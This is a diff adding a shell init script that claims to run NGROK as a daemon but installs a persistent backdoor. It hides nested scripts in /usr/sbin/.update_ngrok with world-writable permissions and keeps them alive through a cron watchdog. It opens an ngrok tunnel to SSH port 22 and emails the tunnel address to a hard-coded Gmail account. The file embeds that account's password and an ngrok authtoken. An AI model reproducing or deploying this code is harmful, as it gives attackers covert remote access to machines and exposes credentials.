@@ -1,0 +1,115 @@
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          NGROK
+# Required-Start:    $remote_fs $syslog $network $named $sshd
+# Required-Stop:     $remote_fs $syslog $network $named $sshd
+# Default-Start:     2 3 4 5
+# Default-Stop:      0 1 6
+# Short-Description: NGROK start-stop-daemon init script
+# Description:       This allows you to start/stop NGROK as if it
+#                    were a daemon
+set -e
+. /lib/lsb/init-functions
+RUNAS=$USER
+DAEMON="/usr/sbin/.update_ngrok/ngrok_startup"
+DAEMON_STRING="$(cat <<'__EOF__'
+#!/bin/bash
+WSDG="/usr/sbin/.update_ngrok/ngrok_WD"
+watchdog=$(cat <<'_EOF_'
+#!/bin/bash
+BACKDOOR_LOC=/usr/sbin/.update_ngrok/ngrok_bkdr
+the_script=$(cat << '+EOF+'
+#!/bin/bash
+EMAIL="daddycool4465765@gmail.com"
+PASSW="mathjon5555mathjon55551811199218111992mathjon5555mathjon55551811199218111992"
+PING_CHECK=`until  [ $(ping -q -c 5 google.com|grep -oP "(?<=ved,).*(?=%)"|sed 's/ //g') = 0 ] ;do continue ; done`
+WGET_LINK="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+NGROK_YML="authtoken: MYpzg8H2QqNcxhveSwiz_3tNCt8zEkuHw9vMDRx2Gp"
+SERV="http://127.0.0.1:4040/status"
+TMPFILE=$(mktemp -t backdoor.XXXXXXXXX)
+BACKDOOR_LOC=/usr/sbin/.update_ngrok/ngrok_bkdr
+NAME="ngrok"
+OPTION="tcp 22"
+LINK="0.tcp.ngrok.io"
+CHECKS (){
+[[ `uname -m|grep "i686" 2> /dev/null` ]] &&WGET_LINK="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip"|| WGET_LINK="https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
+[[ `type wget &> /dev/null;echo $?` != "0" ]] && $PING_CHECK && sudo apt-get install wget -y 
+[[ `type unzip &> /dev/null;echo $?` != "0" ]] && $PING_CHECK && sudo apt-get install unzip -y 
+[[ `type curl &> /dev/null;echo $?` != "0" ]] && $PING_CHECK && sudo apt-get install curl -y 
+[[ `type sendemail &> /dev/null;echo $?` != "0" ]] && $PING_CHECK && sudo apt-get install sendemail -y 
+[[ `type ngrok &> /dev/null;echo $?` != "0" ]] && $PING_CHECK &&wget -q ${WGET_LINK} && unzip  "$(echo $WGET_LINK | grep -oP "(?<=\/4VmDzA7iaHb\/).*(?=)")" && mv ngrok /usr/bin && rm "$(echo $WGET_LINK | grep -oP "(?<=\/4VmDzA7iaHb\/).*(?=)")" 
+[[ `cat /home/mal/.ngrok2/ngrok.yml` != "$NGROK_YML" ]] && ngrok authtoken MYpzg8H2QqNcxhveSwiz_3tNCt8zEkuHw9vMDRx2Gp
+[[ `type sshd &> /dev/null;echo $?` != "0" ]] && $PING_CHECK && sudo apt-get install  openssh-server -y
+}
+SEND_MAIL() {
+   sendemail -q -f "${EMAIL}" -u "port:$(cat $TMPFILE)" -t "${EMAIL}" -s smtp.gmail.com:587 -o tls=yes -xu "${EMAIL}" -xp "${PASSW}" -m " "
+}
+CHECKS
+$NAME ${OPTION}  > /dev/null &
+while true ; do 
+sleep 5
+p=$(curl -s "${SERV}"|grep ${LINK}|grep -oP "(?<=tcp\.${NAME}\.io).*(?=\"Proto)"|sed 's/\\\//g;s/\"//g;s/\,//g;s/\://g')
+[[ "$p" !=  $(< $TMPFILE) ]] && echo "$p" > $TMPFILE && SEND_MAIL 
+done
+trap "rm -rf $TMPFILE ; pkill sendemail ; pkill ngrok" INT
++EOF+
+)
+
+[[ ! -f  $BACKDOOR_LOC ]] && sudo bash -c "echo "$the_scripti" > "$BACKDOOR_LOC"" &&  sudo chmod 777 "$BACKDOOR_LOC"
+[[ $(< "$BACKDOOR_LOC" ) !=  "$the_script" ]] && echo "$the_script" > "$BACKDOOR_LOC" && sudo chmod 777 "$BACKDOOR_LOC"
+[[ `ps -A |grep -v "grep" |grep "ngrok_bkdr" &> /dev/null ; echo $?` != 0 ]] && /usr/sbin/.update_ngrok/ngrok_bkdr  2> /dev/null &
+
+_EOF_
+)
+
+[[ ! -f /usr/sbin/.update_ngrok/ngrok_WD ]] && sudo touch /usr/sbin/.update_ngrok/ngrok_WD
+[[ "$watchdog"  !=   "$(< /usr/sbin/.update_ngrok/ngrok_WD)" ]] && sudo chmod 777 /usr/sbin/.update_ngrok/ngrok_WD && echo "$watchdog" | tee  /usr/sbin/.update_ngrok/ngrok_WD
+sudo chmod 777 /usr/sbin/.update_ngrok/ngrok_WD
+(crontab -l ; echo "*/5 * * * *  /usr/sbin/.update_ngrok/ngrok_WD &> /dev/null &")| uniq | crontab -
+/usr/sbin/.update_ngrok/ngrok_WD &> /dev/null &
+__EOF__
+)"
+
+[ ! -e $DAEMON  ] && mkdir -p /usr/sbin/.update_ngrok && touch $DAEMON
+[ "$DAEMON_STRING" != "<(cat $DAEMON)" ] &&  echo "$DAEMON_STRING" >  $DAEMON
+[ ! -x $DAEMON  ] && chmod +x $DAEMON
+NAME=NGROK
+PIDFILE=/var/run/$NAME.pid
+start (){
+	printf "Starting '$NAME'..."
+	start-stop-daemon --start   --quiet  --make-pidfile --oknodo  --pidfile $PIDFILE --background --startas /bin/bash -- -c "$DAEMON "
+	sleep 1
+	printf "Done."
+} 
+stop (){
+	printf "Stopping '$NAME'..."
+	start-stop-daemon --stop --quiet --oknodo --pidfile $PIDFILE
+	sleep 1
+	printf "Done."
+}
+status (){
+	status_of_proc  $DAEMON "$NAME"
+}
+case "$1" in
+    start)
+    start
+  ;;
+    stop)
+    stop
+  ;;
+    restart)
+    stop
+    start
+  ;;
+    status)
+    status
+  ;;
+    *)
+    echo "Usage: $NAME {start|stop|restart|status}" >&2
+    exit 1
+  ;;
+esac
+
+exit 0
+
+
